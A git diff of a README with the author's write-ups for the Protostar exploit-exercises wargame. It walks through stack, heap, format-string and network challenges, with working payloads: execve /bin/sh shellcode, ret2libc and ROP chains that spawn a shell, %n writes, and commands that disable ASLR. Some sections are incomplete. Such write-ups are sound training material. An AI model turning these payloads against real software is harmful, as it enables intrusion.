@@ -1,10 +1,8 @@
-# protostar
-protostar sploits and solutions 
-https://exploit-exercises.com/protostar
+#protostar writeups
 
-NOTE: write ups in progress. Adding python exploit poc's to each excercise for practice!
+NOTE: write ups in progress!
 
-##INDEX
+# INDEX
 
 | Challenge                        |
 | :------------------------------- | 
@@ -26,10 +24,11 @@ NOTE: write ups in progress. Adding python exploit poc's to each excercise for p
 |[net2](#net2)|
 
 
-#Stack0
----------------------------------------
-###Source Code:
-```C
+# Stack0
+
+### Source Code:
+
+```c
 int main(int argc, char **argv)
 {
   volatile int modified;
@@ -45,20 +44,27 @@ int main(int argc, char **argv)
   }
 }
 ```
-###Stack:
 
+### Stack:
+
+```bash
 | eip | ebp | modified(0) |   buffer    |
+```
 
-###The plan:
+### The plan:
+
 fill buffer with gets 
 since buffer = 64 bytes, an input of 65 bytes should overflow and overwrite modified
 
-###winning command:
+### winning command:
+
 ```bash
 python -c "print 'a'*64+'1'" | ./stack0
 ```
-###Python exploit:
-```Python
+
+### Python exploit:
+
+```python
 from subprocess import Popen, PIPE
 ################
 buffer = 64 
@@ -68,16 +74,12 @@ input=fill+"1"
 cproc = Popen("./stack0", stdin=PIPE, stdout=PIPE)
 print cproc.communicate(input)[0]   
 ```
-        
-        
-        
-        
-        
 
-#Stack1
----------------------------------------
-###Source Code:
-```C
+# Stack1
+
+### Source Code:
+
+```c
 #include <stdlib.h>
 #include <unistd.h>
 #include <stdio.h>
@@ -102,18 +104,26 @@ int main(int argc, char **argv)
   }
 }
 ```
-###Stack:
-| eip | ebp | modified(0) |   buffer    |
 
-###Plan:
+### Stack:
+
+```bash
+| eip | ebp | modified(0) |   buffer    |
+```
+
+### Plan:
+
 This challenge is similar to the last one with a few differences.  It takes command line args instead of gets, and instead of setting modified to 1, we need to set it to 0x61626364 ("abcd" in ascii). Like the previous challenge, we just fill up buffer and overflow the correct value into modified. Since it's little endian, we need to craft our input so that the value sits in memory correctly. 
 
-###winning command:
+### winning command:
+
 ```bash
 ./stack1 $(python -c "print 'a'*64+'dcba'")
 ```
-###Python exploit:
-```Python
+
+### Python exploit:
+
+```python
 from subprocess import Popen, PIPE
 ################
 buffer = 64
@@ -125,12 +135,12 @@ print cproc.communicate()[0]
 ```
 
 
-
-
-#Stack2
+# Stack2
 ---------------------------------------
-###Source Code:
-```C
+
+### Source Code:
+
+```c
 #include <stdlib.h>
 #include <unistd.h>
 #include <stdio.h>
@@ -160,18 +170,24 @@ int main(int argc, char **argv)
 
 }
 ```
-###Stack:
-| eip | ebp | modified(0) |   buffer    | variable pointer|
 
-###Plan:
+### Stack:
+```bash
+| eip | ebp | modified(0) |   buffer    | variable pointer|
+```
+
+### Plan:
 Use an environment variable to overflow buffer via strcpy and fill modified with correct value.
 
-###winning command:
+### winning command:
+
 ```bash
 
 ```
-###Python exploit:
-```Python
+
+### Python exploit:
+
+```python
 from subprocess import Popen, PIPE
 import os
 ################
@@ -189,10 +205,11 @@ print cproc.communicate()[0]
 
 
 
-#Stack3
----------------------------------------
-###Source Code:
-```C
+# Stack3
+
+### Source Code:
+
+```c
 #include <stdlib.h>
 #include <unistd.h>
 #include <stdio.h>
@@ -218,18 +235,25 @@ int main(int argc, char **argv)
   }
 }
 ```
-###Stack:
-| eip | ebp | fp(0) |   buffer  |
 
-###Plan:
+### Stack:
+
+```bash
+| eip | ebp | fp(0) |   buffer  |
+```
+
+### Plan:
 Another overflow. This time we need to use objdump/gdb to find the memory location of the win function. There are a few ways to accomplish this, so I will cover two.
-####Objdump
+#### Objdump
 run the following to generate your assembly:
+
 ```bash
 objdump -d ./stack2 | ./stack2.s
 ```
+
 after reviewing your assembly, you can see the following
-```asm
+
+```nasm
 08048424 <win>:
  8048424:	55                   	push   %ebp
  8048425:	89 e5                	mov    %esp,%ebp
@@ -239,19 +263,24 @@ after reviewing your assembly, you can see the following
  8048436:	c9                   	leave  
  8048437:	c3                   	ret   
 ```
-####gdb
+
+#### gdb
 use the following command in gdb to print the memory location of win
+
 ```
 x win
 ```
 
 we now know win is at 0x08048424 in memory, so we craft an input that overflows into fp with this location (adjusted for endianess) 
-###winning command:
+### winning command:
+
 ```bash
 python -c "print 'a'*64+'\x24\x84\x04\x08'" | ./stack3 
 ```
+
 ###Python exploit:
-```Python
+
+```python
 from subprocess import Popen, PIPE
 import os
 ################
@@ -267,12 +296,11 @@ print cproc.communicate(input)[0]
 
 
 
+# Stack4
 
+### Source Code:
 
-#Stack4
----------------------------------------
-###Source Code:
-```C
+```c
 #include <stdlib.h>
 #include <unistd.h>
 #include <stdio.h>
@@ -290,25 +318,34 @@ int main(int argc, char **argv)
   gets(buffer);
 }
 ```
-###Stack:
-| eip | ebp |   buffer  |
 
-###Plan:
+### Stack:
+
+```bash
+| eip | ebp |   buffer  |
+```
+
+### Plan:
 Another overflow. This time we need to use objdump/gdb to find the memory location of the win function, then we want to overwrite EIP so that we return to win.
 First we find where we need to jump with gdb.
-```
+
+```bash
 $ gdb ./stack4
 GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
 Reading symbols from ./stack4...done.
 (gdb) x win
 0x80483f4 <win>:        0x83e58955
 ```
+
 By looking at the source code, you might assume that we simply need to fill buffer(64bytes), which will then overflow into EBP(4bytes) and then the next bytes of our input would overwrite EIP. We could try something like this
+
 ```bash
 python -c "print (68*'a')+'\xf4\x83\x04\x08'" | ./stack4
 ```
+
 This does not work, and it's because (as the hint says) compilers behavior isnt always apparent.
 So lets fire up GDB
+
 ```bash
 $ gdb ./stack4
 Reading symbols from ./stack4...done.
@@ -349,26 +386,33 @@ $1 = (void *) 0xffffd128
 $2 = 76                            
 (gdb) 
 ```
+
 Now we know the offset is actually 76 so we can craft an input and test
+
 ```bash
 $ python -c "print 'a'*76+'aaaa'" | ./stack4                                                                                                            
 Segmentation fault
 ```
 
 Good sign! Now we replace 'aaaa' with our target location(win) which was at 080483f4.
+
 ```bash
 $ python -c "print 'a'*76+'\xf4\x83\x04\x08'" | ./stack4
 code flow successfully changed
 Segmentation fault
 ```
+
 We could probably get rid of the segfault but we wont worry about that now
 
-###winning command:
+### winning command:
+
 ```bash
 python -c "print 'a'*76+'\xf4\x83\x04\x08'" | ./stack4
 ```
-###Python exploit:  (BROKEN, need to figure out why popen isnt working)
-```Python
+
+### Python exploit:  (BROKEN, need to figure out why popen isnt working)
+
+```python
 from subprocess import Popen, PIPE
 import os
 ################
@@ -381,12 +425,11 @@ cproc = Popen(["./stack4"], stdin=PIPE, stdout=PIPE)
 print cproc.communicate(input)
 ```
 
+## Stack5
 
+### Source Code:
 
-##Stack5
----------------------------------------
-###Source Code:
-```C
+```c
 #include <stdlib.h>
 #include <unistd.h>
 #include <stdio.h>
@@ -399,20 +442,27 @@ int main(int argc, char **argv)
   gets(buffer);
 }
 ```
-###Stack:
-| eip | ebp |  buffer    |
 
-###Plan:
+### Stack:
+
+```bash
+| eip | ebp |  buffer    |
+```
+
+### Plan:
 Simple overflow, but this time we need to get some shellcode to run. 
+
 Objectives:
 -figure out where input starts in memory
 -determine EIP location to overwrite 
 -craft input that fills memory with shellcode and overwrites EIP so that our program returns to the shellcode location and executes.
 
 NOTES: this is the first exercise where ASLR will mess up your exploit because every time the program executes, the location that your shellcode sits in memory will change. Use the following command:
+
 ```bash
 echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 ```
+
 Next, fire up GDB
 
 ```bash
@@ -420,7 +470,7 @@ $ gdb ./stack5
 Reading symbols from ./stack5...done.
 gdb$ disas main
 ```
-```asm
+```nasm
 Dump of assembler code for function main:
    0x080483c4 <+0>:     push   %ebp
    0x080483c5 <+1>:     mov    %esp,%ebp
@@ -465,10 +515,13 @@ gdb$
 So now we have our locations and our offset. Time to craft an input. I used http://shell-storm.org/shellcode/ to find some shellcode to use. I settled on http://shell-storm.org/shellcode/files/shellcode-811.php for this example, which is a basic 28byte execve(bin/sh) command. 
 
 For our input, we'll put our shellcode + filler + target return location
+
 ```bash
 python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+('a'*48)+'\xe0\xd5\xff\xff'"  > testme
 ```
+
 Now we test with GDB
+
 ```bash
 $ gdb ./stack5
 Reading symbols from ./stack5...done.
@@ -497,19 +550,24 @@ Cannot insert breakpoint 1.
 Cannot access memory at address 0x80483d9
 
 ```
+
 Great! So our exploit works in GDB, lets try it outside of the debugger--
 
 ```bash
 python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+('a'*48)+'\xe0\xd5\xff\xff'" | ./stack5                                                                                                                                                                                                  
 Illegal instruction (core dumped)   #not so fast!
 ``` 
+
 So what happened? Well, there are some differences in how the program runs when you run it normally and within GDB (guessing due to env variables, a wrapper will also fix this ). 
 So we will take a look at the core dump to see what's going on and see where exactly everything sits in memory when a user runs the program.
 First run the following command to allow core dumps to be saved
+
 ```bash
 ulimit -c unlimited 
 ```
+
 Now we can get into how to examine core dumps with gdb!
+
 ```bash
 $ python -c "print 'a'*76+'xxxx'" | ./stack5
 Segmentation fault (core dumped)
@@ -538,30 +596,38 @@ gdb$ x/60wx 0xffffd5e0
 0xffffd6c0:     0x00000000      0xa9142257      0x90ac2647      0x00000000
 ```
 So we alter our input with the new memory locations, and come up with an input like this:
+
 ```bash
 $ python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+('a'*48)+'\x40\xd6\xff\xff'" > stack5sploit
 ```
+
 Now for some weirdness . I was stuck for a while on this part, because if you run 
+
 ```bash
 $ cat stack5sploit | ./stack5
 $ 
 ```
+
 We're getting our shell , but it exits immediately. After some research, I found a few solutions. Apparently shell redirection "<"
 appends an EOF after redirecting payload5.
 You can choose a different shellcode, or use the following trick. (thanks http://www.kroosec.com/2012/12/protostar-stack5.html)
+
 ```bash
 (cat stack5sploit; cat) | ./stack5
 ```
-###winning command:
+
+### winning command:
+
 ```bash
 $ python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'+('a'*48)+'\x40\xd6\xff\xff'" > stack5sploit
 (cat stack5sploit; cat) | ./stack5
 ```
 
-##Stack6
----------------------------------------
-###Source Code:
-```C
+## Stack6
+
+### Source Code:
+
+```c
 #include <stdlib.h>
 #include <unistd.h>
 #include <stdio.h>
@@ -591,10 +657,14 @@ int main(int argc, char **argv)
   getpath();
 }
 ```
-###Stack:
-| eip | ebp | int ret |char buffer[64]  |
 
-###Plan:
+### Stack:
+
+```bash
+| eip | ebp | int ret |char buffer[64]  |
+```
+
+### Plan:
 So this program basically uses gets to grab an input for buffer, then uses builtin_return_address(0) to get the return address of the current function and prevents it from returning to any address in the 0xbf------ range.(likely where our buffer is to prevent shellcode execution). So in this one, we will go a different route and use Return to libc.
 
 First we need to find our offset 
@@ -604,7 +674,7 @@ l:~/workspace/proto (master) $ ulimit -s unlimited
 l:~/workspace/proto (master) $ gdb ./stack6      
 gdb$ disas getpath
 ```
-```asm
+```nasm
   Dump of assembler code for function getpath:
    0x08048484 <+0>:     push   ebp
    0x08048485 <+1>:     mov    ebp,esp
@@ -691,10 +761,12 @@ warning: Unable to access 16000 bytes of target memory at 0x5573ac2c, halting se
 1 pattern found.
 gdb$ quit
 ```
+
 So now that we have our offset, and the locations in memory we can form the following payload by setting up the stack like follows:
 
 FILLER + SYSTEM function call + Return value for System function call+ ARG FOR SYSTEM function call
 For mine, i wanted it to exit cleanly after the shell, so i made SYSTEM's return value the function call for EXIT.
+
 ```python
        #fill          #system               #exit                 #bin/sh
 print 'A'*0x50 + '\x90\xc1\x5c\x55'+  '\xe0\xf1\x5b\x55'   +'\x24\xca\x6e\x55'"
@@ -702,21 +774,25 @@ print 'A'*0x50 + '\x90\xc1\x5c\x55'+  '\xe0\xf1\x5b\x55'   +'\x24\xca\x6e\x55'"
 
 Now, we need to do the same trick to keep stdin open by using  (cat payload; cat) | ./path - see below  
 
-###winning command:
+### winning command:
+
 ```bash
 $ python -c "print 'A'*0x50+'\x90\xc1\x5c\x55'+  '\xe0\xf1\x5b\x55'   +'\x24\xca\x6e\x55'" > stack6sploit
  (cat stack6sploit; cat) | ./stack6   
 ```
-###Python exploit:
+
+### Python exploit:
+
 ```Python
 COMING SOON
 ```
 
 
-##Stack7
----------------------------------------
-###Source Code:
-```C
+## Stack7
+
+### Source Code:
+
+```c
 #include <stdlib.h>
 #include <unistd.h>
 #include <stdio.h>
@@ -746,33 +822,36 @@ int main(int argc, char **argv)
 {
   getpath();
 
-
-
 }
 ```
-###Stack:
-| EIP | EBP | BUFFER |
 
-###Plan:
+### Stack:
+
+```bash
+| EIP | EBP | BUFFER |
+```
+
+### Plan:
 So for this challenge, its basically the same as stack6, but strdup is called. This function allocates space on the heap and copies a string to it. Knowing this, stack7 could be solved by predicting the heap location and jumping there to execute shellcode, but I wanted to experiment with chaining ROP gadgets. I will do my best to explain the whole process so that it hopefully proves useful for someone out there trying to learn!
 
 ###Resources:
-http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html
 
-https://www.exploit-db.com/docs/28479.pdf
+[CodeArcana ROP](http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html)
+[Exploit DB ROP guide](https://www.exploit-db.com/docs/28479.pdf)
+[System Calls](https://www.tutorialspoint.com/assembly_programming/assembly_system_calls.htm)
+[Rotlogix arm exploit](http://rotlogix.com/2016/05/03/arm-exploit-exercises/)
 
-https://www.tutorialspoint.com/assembly_programming/assembly_system_calls.htm
-
-http://rotlogix.com/2016/05/03/arm-exploit-exercises/
-
-###ROP Gadgets---- What exactly are they?
+### ROP Gadgets---- What exactly are they?
 A ROP gadget is basically just the tail end of a function that ends in ret. 
+
 EXAMPLE:
-```asm
+
+```nasm
 pop $eax;
 ret;
 ```
-###What can we do with them? 
+
+### What can we do with them? 
 We can piece together a bunch of ROP gadgets, along with values on our stack to perform just about anything. In my example we will be executing a system call to execve with specific parameters in order to get a shell. After we design our stack with the proper values and rop gadgets, we will be getting a shell via execve.
 
 First things first, we will find our offset and what input we need to overwrite our EIP so that we can jump to a location in memory.
@@ -787,13 +866,16 @@ We see that during a system call, EAX is set to a specific value and then INT 0x
 So we need to figure out what value we need to load into EAX for execve.
 
 Notice in the source code, we have 
-```C
+
+```c
 #include <unistd.h>
 ```
+
 unistd.h is the header file that provides access to the OS API. This means we can examine this header file, and figure out
 what value will get us EXECVE.
 
 I got snagged here for a bit. I did these challenges on a 64 bit system, so I had a couple of unistd.h's .
+
 ```
 /usr/include/unistd.h
 /usr/include/asm/unistd.h
@@ -801,18 +883,22 @@ I got snagged here for a bit. I did these challenges on a 64 bit system, so I ha
 /usr/include/asm/unistd_x32.h
 /usr/include/asm/unistd_32.h
 ```
+
 The others check your architecture and point you to correct header, and since our program was compiled for x86, we actually use the following header file:
 /usr/include/asm/unistd_32.h
+
 ```bash
 le91688:/usr/include/asm $ cat unistd_32.h | grep "execve"
 #define __NR_execve 11
 ```
+
 So we see that 11 or 0xb is our value we want EAX to be when we call our interrupt.  Now that we have our system call figured out, we need to figure out what parameters to pass to it, and what registers to use.
 
-Recommended Reading:
-http://hackoftheday.securitytube.net/2013/04/demystifying-execve-shellcode-stack.html
+### Recommended Reading:
+[Demistifying execve](http://hackoftheday.securitytube.net/2013/04/demystifying-execve-shellcode-stack.html)
 
 Lets check out EXECVE by looking at the man page:
+
 ```bash
 le91688:$ man execve
 EXECVE(2)                                             Linux Programmer's Manual                  EXECVE(2)
@@ -826,17 +912,20 @@ SYNOPSIS
        int execve(const char *filename, char *const argv[],
                   char *const envp[]);
 ```
-####filename
+
+#### filename
 The first arg needs to be a pointer to a string that is a path to the binary 
 in our case, a ptr to "/bin/sh"
-####argv[]
+#### argv[]
 The second is the list of args to the program, and since we are not running /bin/sh with any args, we can set this to a null byte
-####envp[]
+#### envp[]
 the third arg is for environment options, again we'll set this to a null byte
 Our call should look like this:
+
 ```c
 execve('/bin/sh',0,0)
 ```
+
 So now we know how we need to call execve, now we need to figure out how to do it.
 
 To perform our system call we do the following:
@@ -844,21 +933,22 @@ To perform our system call we do the following:
 * Store the arguments to the system call in the registers EBX, ECX, etc.
 
 This means we need our registers set up like this
-```asm
+
+```nasm
 EAX = 0xb (sys call value for execve)
 EBX = ptr to "/bin/sh"
 ECX = 0x0
 EDX = 0x0
 ```
-Now we need to go gather some gadgets to make the magic happen. 
-I used ROPgadget, you can grab it here:
 
-https://github.com/JonathanSalwan/ROPgadget
+Now we need to go gather some gadgets to make the magic happen. 
+I used ROPgadget, you can grab it [here](https://github.com/JonathanSalwan/ROPgadget).
 
 NOTE: i realize i'm not using this tool to its fullest potential, but I will show how I was able to grab gadgets, if you have any tips feel free to comment!  I also saw the --ROPchain switch, but thats no fun ;)
 
 At first, I tried running ROPgadget on the binary ( ./stack7) itself, and only found ~70 gadgets, but nothing useful.  After some professional help (thanks @rotlogix) , I learned that you need to run it on the library itself.
 We need to find what library is being loaded in memory at runtime:
+
 ```bash
 le91688:~/workspace/proto (master) $ gdb ./stack7
 Reading symbols from ./stack7...done.
@@ -873,7 +963,9 @@ From        To          Syms Read   Shared Object Library
 0x555a5490  0x556d699e  Yes (*)     /lib/i386-linux-gnu/libc.so.6   #<<------ target library to grab gadgets!
 gdb$ quit
 ```
+
 So now we can run ROPgadget on libc.so.6 and pipe it to a file "LIBCgadgets" I will then grep this for gadgets!
+
 ```bash
 le91688:~/workspace/proto$ ROPgadget --binary /lib/i386-linux-gnu/libc.so.6 > ./LIBCgadgets
 le91688:~/workspace/proto$ grep -w "xor eax, eax" LIBCgadgets
@@ -886,17 +978,21 @@ le91688:~/workspace/proto$ grep -w "xor eax, eax" LIBCgadgets
 0x0002f0ec : xor eax, eax ; ret
 le91688:~/workspace/proto$ grep -w "xor eax, eax" LIBCgadgets
 ```
+
 Using this i'm able to find the following useful gadgets:
-```asm
+
+```nasm
 0x000f9482  : pop ecx ; pop ebx ; ret       #load values from stack to ECX, EBX
 0x00001aa2  : pop edx ; ret                 #load value in EDX
 0x001454c6  : add eax, 0xb ; ret            #add 0xb to EAX
 0x0002f0ec  : xor eax, eax ; ret            #Zero out EAX
 0x0002e725  : int 0x80                      #syscall
 ```
+
 Now, the memory values for each gadget are the offset within the loaded library, so we need to get the base address of the library when its loaded.
 
 Warning: GDB info sharedlibrary is not a good way to do this and will lead to anger and hatred. Please dont ask me how i know. Instead use the following method. We will also grab the location of "bin/sh" in memory, as done in stack6.
+
 ```bash
 le91688:~/workspace/proto (master) $ ulimit -s unlimited  <--- DONT FORGET THIS, DISABLE LIBRARY RANDOMIZATION
 le91688:~/workspace/proto (master) $ gdb ./stack7
@@ -941,7 +1037,8 @@ So we have can see that our library libc-2.19.so is loaded in memory starting at
 
 We are starting to get a pile of info, but I promise it will all come together soon, beautifully!
 Next, lets design our stack:
-```asm
+
+```nasm
 higher memory
 +----------------------+
 |   INT0x80            |  syscall should be "execve( "/bin/sh",0,0)
@@ -969,8 +1066,9 @@ higher memory
 
 Now we can put this all together with python
 
-###Python script (ropchain.py):
-```Python
+### Python script (ropchain.py):
+
+```python
 #!/usr/bin/env python
 from struct import pack
 
@@ -1004,7 +1102,8 @@ print (p)                          #for simplicity I just printed the value
 
 Now we use our cat trick to keep stdin open and get our shell!
 
-###winning command:
+### winning command:
+
 ```bash
 le91688:~/workspace/proto (master) $ ulimit -s unlimited   <--- ensure lib randomization is off
 le91688:~/workspace/proto$ python ./ropchain.py 
@@ -1016,10 +1115,11 @@ whoami
 ubuntu
 ```
 
-##net0
----------------------------------------
-###Source Code:
-```C
+## net0
+
+### Source Code:
+
+```c
 #include "../common/common.c"
 
 #define NAME "net0"
@@ -1068,11 +1168,12 @@ int main(int argc, char **argv, char **envp)
 }
 ```
 
-###Plan:
+### Plan:
 This challenge introduces some socket programming. 
 
-###Python exploit:
-```Python
+### Python exploit:
+
+```python
 import socket
 import struct
 
@@ -1099,10 +1200,11 @@ print response
 ```
 
 
-##net1
----------------------------------------
-###Source Code:
-```C
+## net1
+
+### Source Code:
+
+```c
 #include "../common/common.c"
 
 #define NAME "net1"
@@ -1161,11 +1263,12 @@ int main(int argc, char **argv, char **envp)  #set up listener
 }
 ```
 
-###Plan:
+### Plan:
 More socket programming with some value conversions 
 
-###Python solution:
-```Python
+### Python solution:
+
+```python
 import socket
 import struct
 
@@ -1194,10 +1297,11 @@ response = client.recv(4096)
 print response
 ```
 
-##Net2
----------------------------------------
-###Source Code:
-```C
+## Net2
+
+### Source Code:
+
+```c
 #include "../common/common.c"
 
 #define NAME "net2"
@@ -1254,11 +1358,13 @@ int main(int argc, char **argv, char **envp)
 }
 ```
 
-###Plan:
+### Plan:
 This one populates an array and sums the elements into result. It sends you a write() of each array element concatenated as a string.
 So we split the string into an array, unpack each element, sum them up, then pack as an int and send it back!  See code comments for details
-###Python:
-```Python
+
+### Python:
+
+```python
 import socket
 import struct
 from ctypes import *
@@ -1297,66 +1403,79 @@ print response
 
 
 
-##Format0
----------------------------------------
-###Source Code:
-```C
+## Format0
 
+### Source Code:
+
+```c
+incoming
 ```
 
-###Plan:
+### Plan:
 
 
-###winning command:
+### winning command:
+
 ```bash
 ./format0 $(python -c "print '%64d'+'\xef\xbe\xad\xde'")
 ```
-###Python exploit:
-```Python
+
+### Python exploit:
+
+```python
 ```
 
-##Format1
----------------------------------------
-###Source Code:
-```C
+## Format1
+
+### Source Code:
+
+```c
 
 ```
 
-###Plan:
+### Plan:
 
 
-###winning command:
+### winning command:
+
 ```bash
 ./format1 $(python -c 'print "\x38\x96\x04\x08"+"aaaaaaaaaa"+"%127$n"')
 ```
-###Python exploit:
-```Python
+
+### Python exploit:
+
+```python
 ```
 
 
-##Format2
----------------------------------------
-###Source Code:
-```C
+## Format2
+
+### Source Code:
 
 ```
 
-###Plan:
+```
+
+### Plan:
 
 
-###winning command:
+### winning command:
+
 ```bash
 python -c 'print "\xe4\x96\x04\x08"+"%59x."+"%4$n"' | ./format2
 ```
-###Python exploit:
-```Python
+
+### Python exploit:
+
+```python
 ```
 
 
-##heap0
----------------------------------------
-###Source Code:
-```C
+## heap0
+
+### Source Code:
+
+```c
 #include <stdlib.h>
 #include <unistd.h>
 #include <string.h>
@@ -1399,12 +1518,13 @@ int main(int argc, char **argv)
 }
 ```
 
-###Plan:
+### Plan:
 
 First heap exercise
 
 So we check out the objdump and see the following things of interest
-```asm
+
+```nasm
 08048464 <winner>:                              <- location we need to jump to
  8048464:	55                   	push   %ebp
  8048465:	89 e5                	mov    %esp,%ebp
@@ -1425,7 +1545,9 @@ So we check out the objdump and see the following things of interest
  80484ff:	c9                   	leave  
  8048500:	c3                   	ret
 ```
+
 So we fire up GDB and check out the heap
+
 ```bash
 $ gdb ./heap0
 GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
@@ -1445,6 +1567,7 @@ gdb$ x/20wx $eax                                #check out our heap
 0x804a048:      0x00000000      0x00000011      0x08048478      0x00000000
                                                     ^----- our target to overwrite (*fp)
 ```
+
 So now we just need to overflow our heap chunk to overwrite fp. Lets start by finding the offset.
 
 ```bash
@@ -1456,21 +1579,25 @@ gdb$ p 0x0804a050-$eax
 $4 = 0x48             <--- offset!
 gdb$ 
 ```
+
 Now we can throw together a python one liner to overflow fp with the address of  to winner()
+
 ```python           
                 #pad offset      #new target
 python -c "print 'a'*0x48 + '\x64\x84\x04\x08' "
 ```
 
-###winning command:
+### winning command:
+
 ```bash
 ./heap0 $(python -c "print 'a'*0x48+'\x64\x84\x04\x08'")
 ```
 
-##heap1
----------------------------------------
-###source:
-```C
+## heap1
+
+### source:
+
+```c
 #include <stdlib.h>
 #include <unistd.h>
 #include <string.h>
@@ -1507,9 +1634,12 @@ int main(int argc, char **argv)
   printf("and that's a wrap folks!\n");
 }
 ```
-###Plan:
+
+### Plan:
+
 So we see we're strcpying some data into internet.name which are both allocated 8 bytes. Our heap looks something like this
-```asm
+
+```nasm
 lower addr
 +----------------------+\
 |    i1.priority =1    |  \   
@@ -1528,8 +1658,10 @@ lower addr
 +----------------------+/ 
 higher addr
 ```
+
 That means if we overwrite the pointer to name in i2, we can write strcpy data anywhere we want.
 Lets take a look with GDB
+
 ```bash
 gdb ./heap1
 Reading symbols from ./heap1...done.
@@ -1576,8 +1708,10 @@ Starting program: /home/ubuntu/workspace/exploit-exercises/protostar/binaries/he
    0x804856a:   nop
 --------------------------------------------------------------------------------
 ```
+
 Now we just have to figure out how we want to use this. We can overwrite the i2.name pointer to our stack, and then strcpy winner's location to that address, and when we return we can jump to it, but we need to make sure ASLR is off for this.
-###winning command:
+### winning command:
+
 ```bash
                                #ESP on ret of main                       #location of win
 run $(python -c "print 'a'*20+'\x9c\xd0\xff\xff'") $(python -c "print '\x94\x84\x04\x08'")
